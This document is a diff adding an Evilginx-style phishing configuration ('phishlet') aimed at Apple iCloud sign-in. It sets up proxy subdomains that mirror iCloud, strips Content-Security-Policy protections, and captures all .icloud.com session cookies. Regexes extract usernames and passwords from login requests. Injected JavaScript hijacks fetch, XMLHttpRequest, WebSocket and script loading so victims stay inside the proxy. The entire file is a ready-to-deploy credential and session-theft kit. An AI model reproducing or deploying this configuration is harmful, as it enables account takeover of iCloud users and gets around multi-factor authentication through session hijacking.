@@ -1,0 +1,214 @@
+#___________     .__.__    ___ ___                __              .___
+#\_   _____/__  _|__|  |  /   |   \  ____   ____ |  | __ ____   __| _/
+# |    __)_\  \/ /  |  | /    ~    \/  _ \ /  _ \|  |/ // __ \ / __ | 
+# |        \\   /|  |  |_\    Y    (  <_> |  <_> )    <\  ___// /_/ | 
+#/_______  / \_/ |__|____/\___|_  / \____/ \____/|__|_ \\___  >____ | 
+#        \/                     \/                    \/    \/     \/                                                            
+
+author: 'EvilHooked'
+min_ver: '4.3.0'
+
+login:
+  domain: 'www.icloud.com'
+  path: '/'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'setup', orig_sub: 'setup', domain: 'icloud.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'feedbackws', orig_sub: 'feedbackws', domain: 'icloud.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gateway', orig_sub: 'gateway', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ckdatabasews', orig_sub: 'ckdatabasews', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'beta', orig_sub: 'beta', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'future', orig_sub: 'future', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'carry', orig_sub: 'carry', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'sprinkles', orig_sub: 'sprinkles', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
+
+puppet:
+  enabled: true
+  mode: 'mirror'
+  upstream: 'http://127.0.0.1:1000'
+  hosts:
+    - 'www.icloud.com'
+    - 'setup.icloud.com'
+    - 'feedbackws.icloud.com'
+    - 'gateway.icloud.com'
+    - 'ckdatabasews.icloud.com'
+    - 'beta.icloud.com'
+    - 'future.icloud.com'
+    - 'carry.icloud.com'
+
+sub_filters:
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'https://www\.icloud\.com', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'www\.icloud\.com', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'beta', domain: 'icloud.com', search: 'https://beta\.icloud\.com', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'beta', domain: 'icloud.com', search: 'beta\.icloud\.com', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'future', domain: 'icloud.com', search: 'https://future\.icloud\.com', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'future', domain: 'icloud.com', search: 'future\.icloud\.com', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'carry', domain: 'icloud.com', search: 'https://carry\.icloud\.com', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'carry', domain: 'icloud.com', search: 'carry\.icloud\.com', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'sprinkles', domain: 'icloud.com', search: 'https://sprinkles\.icloud\.com', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'sprinkles', domain: 'icloud.com', search: 'sprinkles\.icloud\.com', replace: '{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '://www.icloud.com', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '//www.icloud.com', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'beta.icloud.com', orig_sub: 'beta', domain: 'icloud.com', search: '://beta.icloud.com', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'beta.icloud.com', orig_sub: 'beta', domain: 'icloud.com', search: '//beta.icloud.com', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'future.icloud.com', orig_sub: 'future', domain: 'icloud.com', search: '://future.icloud.com', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'future.icloud.com', orig_sub: 'future', domain: 'icloud.com', search: '//future.icloud.com', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'carry.icloud.com', orig_sub: 'carry', domain: 'icloud.com', search: '://carry.icloud.com', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'carry.icloud.com', orig_sub: 'carry', domain: 'icloud.com', search: '//carry.icloud.com', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'sprinkles.icloud.com', orig_sub: 'sprinkles', domain: 'icloud.com', search: '://sprinkles.icloud.com', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'sprinkles.icloud.com', orig_sub: 'sprinkles', domain: 'icloud.com', search: '//sprinkles.icloud.com', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '<meta http-equiv="Content-Security-Policy" content="(.*?)">', replace: '', mimes: ['text/html'], regexp: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: "<meta http-equiv='Content-Security-Policy' content='(.*?)'>", replace: '', mimes: ['text/html'], regexp: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'https://www\.icloud\.com', replace: 'https://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'www.icloud.com', replace: '{hostname}', mimes: ['application/json', 'text/javascript']}
+  - {triggers_on: 'beta.icloud.com', orig_sub: 'beta', domain: 'icloud.com', search: 'https://beta\.icloud\.com', replace: 'https://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'beta.icloud.com', orig_sub: 'beta', domain: 'icloud.com', search: 'beta.icloud.com', replace: '{hostname}', mimes: ['application/json', 'text/javascript']}
+  - {triggers_on: 'future.icloud.com', orig_sub: 'future', domain: 'icloud.com', search: 'https://future\.icloud\.com', replace: 'https://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'future.icloud.com', orig_sub: 'future', domain: 'icloud.com', search: 'future.icloud.com', replace: '{hostname}', mimes: ['application/json', 'text/javascript']}
+  - {triggers_on: 'carry.icloud.com', orig_sub: 'carry', domain: 'icloud.com', search: 'https://carry\.icloud\.com', replace: 'https://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'carry.icloud.com', orig_sub: 'carry', domain: 'icloud.com', search: 'carry.icloud.com', replace: '{hostname}', mimes: ['application/json', 'text/javascript']}
+  - {triggers_on: 'sprinkles.icloud.com', orig_sub: 'sprinkles', domain: 'icloud.com', search: 'https://sprinkles\.icloud\.com', replace: 'https://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'sprinkles.icloud.com', orig_sub: 'sprinkles', domain: 'icloud.com', search: 'sprinkles.icloud.com', replace: '{hostname}', mimes: ['application/json', 'text/javascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'http://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json', 'application/xhtml+xml', 'text/javascript', 'application/x-javascript', 'application/xml']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"', replace: "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob:; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';\"", mimes: ['text/html', 'application/xhtml+xml']}
+  - {triggers_on: 'setup.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: 'http://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/xhtml+xml', 'text/javascript', 'application/javascript', 'application/x-javascript', 'application/xml']}
+  - {triggers_on: 'feedbackws.icloud.com', orig_sub: 'feedbackws', domain: 'icloud.com', search: 'http://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/xhtml+xml', 'text/javascript', 'application/javascript', 'application/x-javascript', 'application/xml']}
+
+auth_tokens:
+  - domain: '.icloud.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/appleauth/auth/verify/device/key/challenge*'
+  - '/appleauth/auth/federate*'
+  - '/appleauth/auth/signin/init*'
+  - '/appleauth/auth/signin/complete*'
+  - '/appleauth/jslog*'
+
+credentials:
+  username:
+    key: 'accountName'
+    search: '"accountName"\s*:\s*"([^"]+)"'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"(?:password|pass)"\s*:\s*"([^"]+)"'
+    type: 'json'
+
+js_inject:
+  - trigger_domains: ["www.icloud.com", "setup.icloud.com", "feedbackws.icloud.com", "gateway.icloud.com", "ckdatabasews.icloud.com", "beta.icloud.com", "future.icloud.com", "carry.icloud.com", "sprinkles.icloud.com"]
+    trigger_paths: ['/.*/']
+    trigger_mimes: ['text/html']
+    trigger_params: []
+    script: |
+      (function() {
+        var pfHostMap = {"www.icloud.com":"www","setup.icloud.com":"setup","feedbackws.icloud.com":"feedbackws","gateway.icloud.com":"gateway","ckdatabasews.icloud.com":"ckdatabasews","beta.icloud.com":"beta","future.icloud.com":"future","carry.icloud.com":"carry","sprinkles.icloud.com":"sprinkles"};
+        function pfMatchHost(h) {
+          if (!h) return false;
+          return Object.prototype.hasOwnProperty.call(pfHostMap, String(h).toLowerCase());
+        }
+        function pfPhishBase() {
+          var p = location.hostname.split('.');
+          if (p.length >= 3) return p.slice(1).join('.');
+          return location.hostname;
+        }
+        function pfMapHost(hostname) {
+          if (!pfMatchHost(hostname)) return hostname;
+          var h = String(hostname).toLowerCase();
+          var ps = pfHostMap[h];
+          var base = pfPhishBase();
+          return ps ? ps + '.' + base : base;
+        }
+        function pfRewriteUrl(url) {
+          try {
+            var u = new URL(url, location.href);
+            if (!pfMatchHost(u.hostname)) return url;
+            u.hostname = pfMapHost(u.hostname);
+            return u.toString();
+          } catch (e) { return url; }
+        }
+        function pfPatchLinks(root) {
+          var scope = root || document;
+          scope.querySelectorAll('a[href]').forEach(function(a) {
+            var h = a.getAttribute('href');
+            if (h) a.setAttribute('href', pfRewriteUrl(h));
+          });
+          scope.querySelectorAll('form[action]').forEach(function(f) {
+            var a = f.getAttribute('action');
+            if (a) f.setAttribute('action', pfRewriteUrl(a));
+          });
+          scope.querySelectorAll('script[src],link[href],link[rel=modulepreload],[src],[href],[data-url],[data-href]').forEach(function(el) {
+            if (el.tagName === 'SCRIPT') el.removeAttribute('crossorigin');
+            ['src','href','data-url','data-href'].forEach(function(attr) {
+              var v = el.getAttribute(attr);
+              if (v && /^https?:\/\//i.test(v)) el.setAttribute(attr, pfRewriteUrl(v));
+            });
+          });
+        }
+        try {
+          var sp = HTMLScriptElement.prototype;
+          var sd = Object.getOwnPropertyDescriptor(sp, 'src');
+          if (sd && sd.set) {
+            Object.defineProperty(sp, 'src', {
+              configurable: true,
+              enumerable: sd.enumerable,
+              get: sd.get,
+              set: function(v) { sd.set.call(this, typeof v === 'string' ? pfRewriteUrl(v) : v); }
+            });
+          }
+        } catch (e) {}
+        if (window.fetch) {
+          var _fetch = window.fetch.bind(window);
+          window.fetch = function(input, init) {
+            if (typeof input === 'string') return _fetch(pfRewriteUrl(input), init);
+            if (input && input.url) return _fetch(pfRewriteUrl(input.url), init);
+            return _fetch(input, init);
+          };
+        }
+        if (window.XMLHttpRequest) {
+          var _open = XMLHttpRequest.prototype.open;
+          XMLHttpRequest.prototype.open = function(method, url) {
+            var args = Array.prototype.slice.call(arguments);
+            if (args[1]) args[1] = pfRewriteUrl(args[1]);
+            return _open.apply(this, args);
+          };
+        }
+        if (window.WebSocket) {
+          var _WS = window.WebSocket;
+          window.WebSocket = function(url, protocols) {
+            var rw = pfRewriteUrl(url).replace(/^http/i, 'ws');
+            return protocols !== undefined ? new _WS(rw, protocols) : new _WS(rw);
+          };
+          window.WebSocket.prototype = _WS.prototype;
+        }
+        pfPatchLinks(document);
+        var obs = new MutationObserver(function(muts) {
+          muts.forEach(function(m) {
+            m.addedNodes.forEach(function(n) {
+              if (n.nodeType === 1) pfPatchLinks(n);
+            });
+          });
+        });
+        obs.observe(document.documentElement, { childList: true, subtree: true });
+        setInterval(function() { pfPatchLinks(document); }, 2500);
+      })();
+
+flow:
+  cors_credentials: true
+  css_url_canary: true
+  puppet_mirror:
+    native_path_prefixes:
+      - /auth/
+      - /login/sessioncookieredirect
+    sidecar_proxy_hosts: []
+    sidecar_login_host: www.icloud.com
+    sidecar_bootstrap:
+      - host: www.icloud.com
+        paths:
+          - /
+          - ''
+    oauth_session_cookie_names:
+      - sid
+      - idx
+      - jessionid
